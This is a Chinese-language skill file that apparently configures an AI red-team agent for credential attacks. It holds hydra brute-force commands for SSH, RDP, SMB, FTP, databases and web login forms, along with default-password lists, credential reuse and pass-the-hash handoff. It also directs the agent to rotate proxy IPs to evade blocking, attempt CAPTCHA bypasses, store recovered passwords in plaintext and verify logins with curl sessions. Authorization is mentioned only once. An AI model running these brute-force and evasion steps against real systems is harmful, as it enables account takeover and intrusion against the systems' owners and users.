---
name: credential-attack
description: 在线凭据攻击：弱口令/默认口令爆破（hydra），覆盖 SSH/FTP/RDP/SMB/数据库/Web 后台；拿到哈希走 PtH
whenToUse: 发现登录入口（Web 后台/SSH/FTP/RDP/SMB/MySQL/MSSQL/Redis）需要试口令；或已拿到哈希需要横向
role: internal,exploit
enabled: true
---

# 凭据攻击（在线爆破 + 哈希复用）

红队里"拿账号权限"最稳的两条路之一（另一条是配置/源码泄露拿到明文）。
**本技能只管在线把口令试出来**；试出来之后必须**会话实测登录一次**才算拿到账号权限
（红线：只有凭据不算拿到账号；命令见下「输出与落库」第 2 条，轻量会话即可、无需浏览器）。
**离线哈希不由本项目处理**：拿到哈希**优先直接 PtH**（技能 `lateral-movement` 的 impacket 用法）；
本项目不再配置离线破解工具。

## 本机工具

| 工具 | 路径 | 版本 | 用途 |
| --- | --- | --- | --- |
| **hydra** | `/usr/bin/hydra` | 9.7 | 在线爆破，覆盖 50+ 协议 |

字典：**内置弱口令小字典 `$DSH_HOME/redteam/toolkit/wordlists/top_100.txt`（随插件分发，必定存在，优先用）**；
Linux 目标机/跳板机上另有 `/usr/share/wordlists/`（`rockyou.txt` 需 gunzip）与 `/usr/share/seclists/Passwords/`。
**Windows 本机没有 rockyou 与 seclists**：直接用 top_100 或自造小字典，不要执行 `sudo gunzip`。

## 一、在线爆破（hydra）

### 通用语法
```bash
hydra -L users.txt -P pass.txt <protocol>://<target>[:port] [模块参数] -t <并发> -f -o runs/hydra-<target>.txt
```
- `-L` 用户名字典 / `-l` 单个用户名；`-P` 口令字典 / `-p` 单个口令
- `-t` 并发（**默认 16，别超过 16**，多数服务会锁号或封 IP）
- `-f` 命中一个就停（避免把账号打锁）
- `-o` 输出到 `runs/`（报告要靠它复现）
- `-V` 显示每次尝试（调试用，正式跑别开）

### 各协议实例
```bash
# SSH
hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f -o runs/hydra-ssh-10.0.0.5.txt

# RDP（注意：并发必须低，Windows 会锁号）
hydra -L users.txt -P pass.txt rdp://10.0.0.6 -t 2 -f -o runs/hydra-rdp-10.0.0.6.txt

# SMB
hydra -L users.txt -P pass.txt smb://10.0.0.7 -t 4 -f

# FTP
hydra -L users.txt -P pass.txt ftp://10.0.0.8 -t 4 -f

# MySQL
hydra -L users.txt -P pass.txt mysql://10.0.0.9 -t 4 -f

# MSSQL
hydra -L users.txt -P pass.txt mssql://10.0.0.10 -t 4 -f

# Web 表单登录（POST）——最常用
hydra -L users.txt -P pass.txt target.example.com http-post-form \
  "/admin/login.jsp:username=^USER^&password=^PASS^:F=用户名或密码错误" -t 4 -f -o runs/hydra-web-admin.txt

# Web 表单（带额外头/HTTPS）
hydra -L users.txt -P pass.txt -s 443 -S target.example.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=invalid:H=Cookie: JSESSIONID=xxx" -t 4 -f
```

### Web 表单爆破的成败判定（关键）
`http-post-form` 第三段格式：`"<路径>:<POST 体>:<失败条件>"`，**失败条件必须写准**，否则全量误报：
- `F=<失败特征串>`：响应里出现该串表示**失败**（推荐，最稳）
- `S=<成功特征串>`：响应里出现该串表示**成功**（响应无统一失败文案时用）
- 先手工发两次请求（错误口令 vs 正确口令各一次，或对比不存在用户）**确认特征串唯一**，再跑爆破。
- 有验证码 / 图形码 / 滑块：先看能不能绕过（固定验证码、验证码不校验、前端校验），绕不过**不要硬爆**，转别的路（本项目不带浏览器，不做带验证码的登录尝试）。

### 字典与规模纪律（默认不大批量爆破）
**大批量字典爆破（rockyou 级/上万条）默认禁止**——只有两个前提**同时**满足才允许：
目标确认**无锁定/限流**（先试几条看有没有验证码、锁定、429），**且**手上**有该目标的特定字典**（泄露库/行业字典）。
否则在线爆破只允许小步快跑，按优先级：
1. **针对性小字典**（命中率最高）：单位名/品牌/域名/年份组合，如 `单位简称@2026`、`Admin@123`、`<域名>2026`；
   用 `redteam_asset_query` 里的 title/单位信息现造。
2. **默认口令**：产品默认口令（`admin/admin`、`tomcat/tomcat`、`weblogic/weblogic1`、`sa/sa`），
   参考 nuclei 模板 `http/default-logins/`（307 个），**先查 `redteam_poc_search`**。
3. **内置弱口令 top_100**：`$DSH_HOME/redteam/toolkit/wordlists/top_100.txt`（随插件分发）——
   通用弱口令尝试就跑这一份，不要再找更大的；
4. Linux 机上 seclists 的 top 系列可作同级替代；Windows 本机用 top_100 或自造字典。

### 用户名从哪来
- Web 后台：报错信息、JS 里的默认账号、接口返回的 `createBy`、登录页提示、`robots.txt`、员工邮箱前缀；
- 目录爆破命中 `/admin` 时优先试 `admin`、`administrator`、`system`、`test`、`guest`；
- 拿到一个凭据后走**凭据复用**（见下），比爆破快得多。

## 二、凭据复用（比爆破快得多，优先做）

拿到任何一组凭据后，**先横向试**，不要急着爆下一个：
1. `redteam_credential_list` 看已有凭据（含用户名/口令/来源）；
2. 同一口令试：其他同款系统、其他资产的管理端、SSH/RDP/SMB/数据库、VPN/堡垒机/运维平台；
3. 用户名规律（`姓.名`、工号、邮箱前缀）配合已知口令试同系统其它用户；
4. 哈希直接复用：PtH / Pass-the-Key（技能 `lateral-movement`）。

## 三、拿到哈希怎么办（不破解，直接横向）

数据库、配置文件、`/etc/shadow`、Web 应用库里拿到的哈希/密文：**不要等破解**——
优先用哈希直接打（Pass-the-Hash，见技能 `lateral-movement`），
或按凭据复用先试其它主机。本项目不配置离线破解工具；确需还原明文的场景由用户侧自行处理。

## 四、纪律与边界（必须遵守）

1. **先查库**：`redteam_credential_list` / `redteam_asset_query`——别重复爆同一个入口（`blocked_count>0` 的先看原因）。
2. **锁号风险**：Windows（RDP/SMB）与 OA/域账号**严格限流**：`-t 2`（Windows）、`-t 4`（SSH/FTP）、
   字典不超过百条量级；**同一账号连续失败 5 次就停**，换账号或换目标——把账号打锁等于毁掉入口。
3. **同一目标累计被封 >3 次放弃**（`redteam_asset_test` status=abandoned + blocked=true）。
4. **降噪走代理**：Web 表单爆破用技能 `cn-proxy-pool` 换出口 IP；内网目标走隧道（技能 `tunnel-selection`）。
5. **内网弱口令/服务爆破交给技能 `fscan-intranet`（备用；默认不爆破，仅用户明确授权后对已圈定目标定向跑）**；
   hydra 用于它没覆盖的协议或需要精细控制的单点。

## 五、输出与落库（强制）

1. **每条命中立刻 `redteam_credential_add`**：
   - `username`、**明文写 `secret_value`**（面板直接显示，便于随时复用）、`source`（`弱口令`/`默认口令`/`凭据复用`/`泄露`）、
     `tool`（实际命令原文，如 `hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f`）、`secret_ref`（证据文件路径如 `runs/hydra-ssh-10.0.0.5.txt`）。
2. **必须会话实测登录才算拿到权限**（轻量会话三步，内存≈0；目标无独立登录页的跳过）：
   ```bash
   # ① GET 登录页拿 Cookie/CSRF（有隐藏域/动态 token 从源码抠出来一并提交）
   curl -s -c runs/jar 'https://target/login' -o runs/login-page.html
   # ② POST 登录（表单 action 与字段名从 ① 的源码读）
   curl -sv -b runs/jar -c runs/jar -X POST 'https://target/login' \
     -d 'username=USER&password=PASS' -o runs/login-resp.html
   # ③ 判据：带会话拉只有登录后能看的页面，200 + 出现用户名 = 确认进后台
   curl -s -b runs/jar 'https://target/user/info' -o runs/logged-in.html
   grep -c 'username\|用户名\|welcome' runs/logged-in.html
   ```
   `runs/jar`（Cookie）+ 两个 html 即证据 → `redteam_access_add`（`method=web-login`，`note` 写
   「资产｜后台管理员 tomcat/Tomcat@2024」）。内网后台：三条命令各加 `--socks5-hostname 127.0.0.1:<隧道端口>`。
   **登不进去就在 `redteam_asset_test` 的 `test` 里记一行卡点**（哈希未破解/需二次认证/限制来源 IP/账号已禁用），不算成果。
3. **账号权限按服务封顶**：同一资产同一端口拿到管理员即该服务拿满，只算一项成果——不要在同一服务上刷多个账号。
4. 每个关键动作 `redteam_chain_add`：`stage_code=internet`（或 `internal`），
   `tool` 写实际命令、`result` 写回显摘要（如 `ssh 10.0.0.5 用 root/Root@123 登录成功，uid=0(root)`）。
5. 证据文件一律放 `runs/`。
